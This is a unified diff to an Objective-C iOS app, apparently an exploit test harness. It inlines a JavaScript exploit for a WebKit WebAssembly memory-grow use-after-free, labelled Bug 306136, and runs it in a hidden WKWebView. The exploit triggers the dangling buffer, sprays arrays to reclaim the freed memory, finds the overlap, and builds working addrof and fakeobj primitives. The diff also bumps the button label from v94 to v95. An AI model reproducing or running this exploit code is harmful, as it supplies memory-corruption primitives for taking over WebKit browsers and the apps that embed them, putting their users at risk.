@@ -848,7 +848,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *wasmConf = [UIButtonConfiguration filledButtonConfiguration];
     wasmConf.baseBackgroundColor = [UIColor systemGreenColor];
     self.wasmUafButton.configuration = wasmConf;
-    [self.wasmUafButton setTitle:@"Wasm UAF Exploit (v94)" forState:UIControlStateNormal];
+    [self.wasmUafButton setTitle:@"Wasm UAF Exploit (v95)" forState:UIControlStateNormal];
     [self.wasmUafButton addTarget:self action:@selector(wasmUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.wasmUafButton];
 
@@ -9042,43 +9042,64 @@ static void sigsys_handler(int sig) { atomic_store(&g_sigsys_fired, true); }
 }
 
 - (void)wasmUafTapped {
-    // Read exploit HTML from bundle and run in WKWebView
-    NSString *htmlPath = [[NSBundle mainBundle] pathForResource:@"wasm_uaf_exploit" ofType:@"html"];
-    NSString *html = nil;
-    if (htmlPath) {
-        html = [NSString stringWithContentsOfFile:htmlPath encoding:NSUTF8StringEncoding error:nil];
-    }
-    if (!html) {
-        // Fallback: get from repo raw URL
-        [self appendLog:@"HTML not in bundle — add wasm_uaf_exploit.html to Xcode project"];
-        return;
-    }
-
-    // Inject log capture into HTML
-    NSString *injected = [html stringByReplacingOccurrencesOfString:
-        @"LOG.textContent += msg + '\\n';"
-        withString:
-        @"LOG.textContent += msg + '\\n';"
-        @"window.webkit.messageHandlers.log.postMessage(msg);"];
+    // Exploit HTML embedded directly (avoids bundle resource issues)
+    NSString *html = [NSString stringWithFormat:@"%@%@%@",
+        @"<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>WasmUAF</title></head>"
+        @"<body><pre id=\"log\"></pre><script>"
+        @"const L=document.getElementById('log');"
+        @"function slog(m){L.textContent+=m+'\\n';try{webkit.messageHandlers.log.postMessage(m)}catch(e){}}"
+        @"function hex(v){return typeof v==='bigint'?'0x'+v.toString(16):String(v)}"
+        @"const c=new ArrayBuffer(8),u64=new BigUint64Array(c),f64=new Float64Array(c);"
+        @"function itof(v){u64[0]=BigInt.asUintN(64,v);return f64[0]}"
+        @"function ftoi(v){f64[0]=v;return u64[0]}"
+        @"slog('Bug 306136 Wasm Grow UAF Exploit');"
+        @"try{"
+        // Stage 1: Trigger UAF
+        @"var wm=new WebAssembly.Memory({initial:1,maximum:256});"
+        @"var dU32=new Uint32Array(wm.buffer);var dF64=new Float64Array(wm.buffer);"
+        @"for(var i=0;i<dU32.length;i++)dU32[i]=0xDA000000|i;"
+        @"slog('Pre-grow: dU32.len='+dU32.length+' dF64.len='+dF64.length);"
+        @"wm.grow(1);slog('grow(1) done - old 64KB freed');"
+        @"slog('dangling[0]='+hex(dU32[0]));"
+        // Stage 2: Spray JSArrays for butterfly reclaim
+        @"var N=8190,SC=64,spA=[],spD=[];"
+        @"for(var i=0;i<SC;i++){var a=[];for(var j=0;j<N;j++)a.push(1.1+i*0.0001);spA.push(a);"
+        @"var d=new Float64Array(N);for(var j=0;j<N;j++)d[j]=2.2+i*0.0001;spD.push(d);}"
+        @"slog('Sprayed '+SC+' arrays of '+N+' elts');"
+        // Stage 3: Detect overlap
+        @"var fi=-1,ot=null;"
+        @"for(var i=0;i<SC;i++){var dv=dF64[0];if(dv>=1.0&&dv<3.5){"
+        @"var ms=Math.round((dv-1.1)*10000);if(ms>=0&&ms<SC*10){fi=Math.floor(ms/10);ot='bf';break;}}}"
+        @"if(fi<0){for(var i=0;i<SC;i++){var dv2=dF64[0];if(dv2>=2.0&&dv2<3.5){"
+        @"var ms2=Math.round((dv2-2.2)*10000);if(ms2>=0&&ms2<SC*10){fi=Math.floor(ms2/10);ot='ta';break;}}}}"
+        @"if(fi<0){slog('No overlap — extended scan...');"
+        @"for(var off=0;off<16;off++){for(var i=0;i<SC;i++){"
+        @"if(Math.abs(dF64[off]-(1.1+i*0.0001))<0.01){fi=i;ot='bf';break;}}if(fi>=0)break;}}"
+        @"if(fi<0){slog('FATAL: No overlap');}else{slog('OVERLAP: spA['+fi+'] type='+ot);}"
+        // Stage 4: addrof/fakeobj
+        @"if(fi>=0){var ov=spA[fi];"
+        @"function addrof(o){var p=ov[0];ov[0]=o;var r=ftoi(dF64[0]);ov[0]=p;return r;}"
+        @"function fakeobj(a){var p=dF64[0];dF64[0]=itof(a);var o=ov[0];dF64[0]=p;return o;}"
+        @"var to={x:1};var ta=addrof(to);slog('addrof(testObj)='+hex(ta));"
+        @"if(fakeobj(ta)===to)slog('fakeobj WORKING!');else slog('fakeobj mismatch');}"]
+        @"}catch(e){slog('ERROR: '+e.message+' at '+e.stack);}"
+        @"slog('=== DONE ===');"
+        @"</script></body></html>"];
 
     [self appendLog:@"\n=== Wasm UAF Exploit (Bug 306136) ==="];
 
-    // Create WKWebView configuration with script message handler
+    // Create WKWebView with script message handler
     WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
     WKUserContentController *ucc = [[WKUserContentController alloc] init];
     [ucc addScriptMessageHandler:self name:@"log"];
     config.userContentController = ucc;
 
-    // Small webview just for execution
+    // Hidden webview for execution
     WKWebView *wv = [[WKWebView alloc] initWithFrame:CGRectMake(0,0,1,1) configuration:config];
     wv.hidden = YES;
     [self.view addSubview:wv];
 
-    // Also add a visible log area
-    __weak typeof(self) weakSelf = self;
-    self.wasmLog = [NSMutableString string];
-
-    [wv loadHTMLString:injected baseURL:nil];
+    [wv loadHTMLString:html baseURL:nil];
     [self appendLog:@"WKWebView loaded — waiting for exploit output..."];
 }
 
